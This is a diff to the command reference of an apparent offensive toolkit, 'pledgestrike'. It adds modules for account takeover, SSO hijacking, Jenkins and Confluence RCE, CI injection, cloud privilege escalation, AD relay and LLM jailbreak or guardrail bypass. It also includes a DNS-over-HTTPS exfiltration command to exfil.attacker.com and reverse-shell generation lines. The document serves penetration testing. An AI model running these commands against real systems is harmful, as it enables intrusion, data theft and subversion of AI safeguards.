@@ -647,11 +647,13 @@ pledgestrike subdom permutate --domain target.com
 | `scan` | Scan single host for TLS vulnerabilities |
 | `batch` | Batch scan multiple hosts from file |
 | `report` | Generate compliance report |
+| `spoof` | JA3/JA4 fingerprint spoofing |
 
 ```
 pledgestrike tls scan --host example.com --verbose
 pledgestrike tls batch --file hosts.txt --output results.json --workers 10
 pledgestrike tls report --input results.json --format markdown --output report.md
+pledgestrike tls spoof --url https://target.com --ja3 "771,4865-4866-4867...
 ```
 
 ### `whois` — WHOIS Recon
@@ -677,12 +679,14 @@ pledgestrike whois abuse --url target.com
 | Subcommand | Description |
 |------------|-------------|
 | `redirect` | Redirect URI manipulation |
+| `ato` | Account takeover (redirect_uri, state fixation, PKCE bypass) |
 | `state` | State parameter validation |
 | `token` | Token reuse test |
 | `scope` | Scope escalation |
 
 ```
 pledgestrike oauth redirect --auth-url https://target.com/oauth/authorize
+pledgestrike oauth ato --auth-url https://target.com/oauth/authorize
 pledgestrike oauth state --auth-url https://target.com/oauth/authorize
 pledgestrike oauth token --token-url https://target.com/oauth/token --client-id abc123
 pledgestrike oauth scope --token-url https://target.com/oauth/token --client-id abc123
@@ -716,6 +720,42 @@ pledgestrike saml xsw --url https://target.com/saml/acs
 pledgestrike saml response --url https://target.com/saml/acs
 pledgestrike saml cert --url https://target.com/saml/metadata
 pledgestrike saml assertion --url https://target.com/saml/acs
+```
+
+### `oidc` — OIDC Token Confusion
+| Subcommand | Description |
+|------------|-------------|
+| `confuse` | Token confusion, hybrid flow abuse, mix-up attacks |
+
+```
+pledgestrike oidc confuse --url https://target.com
+```
+
+### `passkey` — Passkey/FIDO2 Registration Abuse
+| Subcommand | Description |
+|------------|-------------|
+| `abuse` | Cross-device auth bypass, credential injection, UV bypass |
+
+```
+pledgestrike passkey abuse --url https://target.com
+```
+
+### `sso` — SSO Session Hijacking
+| Subcommand | Description |
+|------------|-------------|
+| `hijack` | Session fixation, token replay, cross-tenant access |
+
+```
+pledgestrike sso hijack --url https://target.com
+```
+
+### `magiclink` — Magic Link Abuse
+| Subcommand | Description |
+|------------|-------------|
+| `abuse` | Token leakage, replay, cross-user authentication |
+
+```
+pledgestrike magiclink abuse --url https://target.com
 ```
 
 ### `webauthn` — WebAuthn/FIDO2
@@ -936,6 +976,33 @@ pledgestrike webrtc fingerprint --url https://target.com
 
 ## CI/CD & Supply Chain
 
+### `jenkins` — Jenkins RCE
+| Subcommand | Description |
+|------------|-------------|
+| `rce` | Unauthenticated API access, script console RCE, credential extraction |
+
+```
+pledgestrike jenkins rce --url https://target.com:8080
+```
+
+### `gitlabci` — GitLab CI Injection
+| Subcommand | Description |
+|------------|-------------|
+| `inject` | Command injection via MR titles, commit messages, variables |
+
+```
+pledgestrike gitlabci inject --url https://target.com
+```
+
+### `gha` — GitHub Actions Injection
+| Subcommand | Description |
+|------------|-------------|
+| `inject` | Script injection via PR titles, issue bodies, branch names, ${{ }} expressions |
+
+```
+pledgestrike gha inject --repo owner/repo --token <GITHUB_TOKEN>
+```
+
 ### `cicd` — CI/CD Attack
 | Subcommand | Description |
 |------------|-------------|
@@ -1105,6 +1172,33 @@ pledgestrike shell listen --port 4444 --bind 0.0.0.0 --encrypt
 pledgestrike shell generate --shell-type bash --ip 10.0.0.1 --port 4444 --base64
 ```
 
+### `stego` — Steganography Detection
+| Subcommand | Description |
+|------------|-------------|
+| `detect` | LSB analysis, entropy, trailing data, metadata anomalies |
+
+```
+pledgestrike stego detect --url https://target.com/images/
+```
+
+### `doh` — DNS over HTTPS Exfiltration
+| Subcommand | Description |
+|------------|-------------|
+| `exfil` | Data exfiltration via DoH providers (bypass DNS monitoring) |
+
+```
+pledgestrike doh exfil --domain exfil.attacker.com --data "secret_data" --provider cloudflare
+```
+
+### `icmp` — ICMP Tunneling
+| Subcommand | Description |
+|------------|-------------|
+| `tunnel` | Covert data exfiltration through firewalls via ICMP |
+
+```
+pledgestrike icmp tunnel --host target.com --data "secret_data"
+```
+
 ### `exfil` — Exfiltration Tester
 | Subcommand | Description |
 |------------|-------------|
@@ -1131,12 +1225,16 @@ pledgestrike exfil stego --url https://target.com --data "secret_data"
 | `jailbreak` | LLM jailbreak |
 | `leak` | Data leak via LLM |
 | `hijack` | LLM hijack |
+| `exfil` | LLM data exfiltration |
+| `bypass` | Safety guardrail bypass |
 
 ```
 pledgestrike llm inject --url https://target.com/chat
 pledgestrike llm jailbreak --url https://target.com/chat
 pledgestrike llm leak --url https://target.com/chat
 pledgestrike llm hijack --url https://target.com/chat
+pledgestrike llm exfil --url https://target.com/chat
+pledgestrike llm bypass --url https://target.com/chat
 ```
 
 ### `agent` — AI Agent Abuse
@@ -1152,6 +1250,118 @@ pledgestrike agent tool --url https://target.com/agent
 pledgestrike agent rag --url https://target.com/agent
 pledgestrike agent memory --url https://target.com/agent
 pledgestrike agent plugin --url https://target.com/agent
+```
+
+### `ai` — AI Model Attack
+| Subcommand | Description |
+|------------|-------------|
+| `extract` | Model stealing via repeated API queries |
+| `hyper` | Hyperparameter inference via timing/output analysis |
+| `adversarial` | Adversarial evasion — perturb inputs for misclassification |
+
+```
+pledgestrike ai extract --url https://target.com/predict --queries 1000
+pledgestrike ai hyper --url https://target.com/predict
+pledgestrike ai adversarial --url https://target.com/classify --input-type text
+```
+
+### `vectordb` — Vector DB Attack
+| Subcommand | Description |
+|------------|-------------|
+| `extract` | Extract vectors and metadata from unauthenticated vector DBs |
+| `enum` | Enumerate collections, indexes, and schema |
+| `probe` | Test for unauthenticated access and open endpoints |
+
+```
+pledgestrike vectordb extract --url https://target.com:8000 --limit 100
+pledgestrike vectordb enum --url https://target.com:8000
+pledgestrike vectordb probe --url https://target.com:8000
+```
+
+---
+
+## Cloud & Container
+
+### `aws` — AWS Attack
+| Subcommand | Description |
+|------------|-------------|
+| `privesc` | IAM privilege escalation (18+ vectors) |
+| `lambda-inject` | Lambda function code injection via event payload |
+
+```
+pledgestrike aws privesc --token <AWS_TOKEN>
+pledgestrike aws lambda-inject --url https://lambda.target.com/ --token <TOKEN>
+```
+
+### `gcp` — GCP Attack
+| Subcommand | Description |
+|------------|-------------|
+| `abuse` | Service account scope/IAM abuse |
+
+```
+pledgestrike gcp abuse --token <GCP_TOKEN>
+```
+
+### `azure` — Azure Attack
+| Subcommand | Description |
+|------------|-------------|
+| `app` | Azure AD app registration permission abuse |
+
+```
+pledgestrike azure app --tenant target.onmicrosoft.com --token <AZURE_TOKEN>
+```
+
+### `tfstate` — Terraform State Exploit
+| Subcommand | Description |
+|------------|-------------|
+| `exploit` | Exploit exposed Terraform state files for secrets |
+
+```
+pledgestrike tfstate exploit --bucket target-tfstate
+```
+
+### `istio` — Istio Service Mesh Attack
+| Subcommand | Description |
+|------------|-------------|
+| `enum` | Enumerate Istio mesh — istiod debug, Envoy admin |
+| `probe` | Test unauthenticated access to control plane |
+
+```
+pledgestrike istio enum --url http://target.com:15010
+pledgestrike istio probe --url http://target.com:15010
+```
+
+### `argocd` — ArgoCD Attack
+| Subcommand | Description |
+|------------|-------------|
+| `enum` | Enumerate apps, clusters, repos, secrets, projects |
+| `probe` | Test unauthenticated access to ArgoCD API |
+
+```
+pledgestrike argocd enum --url https://target.com --token <TOKEN>
+pledgestrike argocd probe --url https://target.com
+```
+
+---
+
+## Modern Web/API
+
+### `dom` — DOM Clobbering
+| Subcommand | Description |
+|------------|-------------|
+| `clobber` | Inject HTML elements to override JS variables |
+
+```
+pledgestrike dom clobber --url https://target.com/page
+```
+
+### `xsleak` — Cross-Site Leak Detection
+| Subcommand | Description |
+|------------|-------------|
+| `detect` | Detect XS-leak vectors — timing, error events, frame count |
+
+```
+pledgestrike xsleak detect --url https://target.com/page
 ```
 
 ---
@@ -1695,6 +1905,42 @@ pledgestrike sharepoint access --url https://target.com/sites
 pledgestrike sharepoint inject --url https://target.com/sites
 ```
 
+### `adcs` — AD CS Abuse
+| Subcommand | Description |
+|------------|-------------|
+| `abuse` | ESC1-ESC14 vulnerability paths, NTLM relay to web enrollment |
+
+```
+pledgestrike adcs abuse --url https://target.com/certsrv --ca-name "CA-Name"
+```
+
+### `ad` — Active Directory Attack
+| Subcommand | Description |
+|------------|-------------|
+| `petitpotam` | PetitPotam NTLM relay coercion via EFSRPC/LSARPC/ICPR |
+
+```
+pledgestrike ad petitpotam --url https://dc.target.com
+```
+
+### `ivanti` — Ivanti Connect Secure
+| Subcommand | Description |
+|------------|-------------|
+| `cve` | CVE-2023-46805 auth bypass + CVE-2024-21887 RCE chain |
+
+```
+pledgestrike ivanti cve --url https://target.com
+```
+
+### `confluence` — Confluence RCE
+| Subcommand | Description |
+|------------|-------------|
+| `rce` | CVE-2023-22515 admin creation + CVE-2023-22518 import RCE |
+
+```
+pledgestrike confluence rce --url https://target.com
+```
+
 ---
 
 ## Access Control
@@ -1740,17 +1986,20 @@ pledgestrike web3 delegatecall --url https://target.com/contract
 | Category | Modules | Subcommands |
 |----------|---------|-------------|
 | Web Application Attacks | 40 | 155 |
-| SSRF & Infrastructure | 11 | 34 |
-| Authentication & Identity | 8 | 30 |
+| SSRF & Infrastructure | 11 | 35 |
+| Authentication & Identity | 13 | 35 |
 | API & Protocol Testing | 9 | 34 |
-| CI/CD & Supply Chain | 4 | 16 |
+| CI/CD & Supply Chain | 7 | 19 |
+| Covert Channels | 3 | 3 |
 | Race Conditions | 2 | 7 |
 | Payload & Exploit Tools | 6 | 22 |
-| AI/LLM Security | 2 | 8 |
+| AI/LLM Security | 4 | 14 |
+| Cloud & Container | 6 | 10 |
+| Modern Web/API | 2 | 2 |
 | JNDI & Injection | 2 | 8 |
 | Network Protocols (IoT/OT) | 5 | 20 |
 | Network Services | 20 | 80 |
-| Microsoft/Enterprise | 4 | 16 |
+| Microsoft/Enterprise | 8 | 20 |
 | Access Control | 1 | 4 |
 | Web3 | 1 | 4 |
-| **Total** | **120** | **~478** |
+| **Total** | **150** | **~542** |
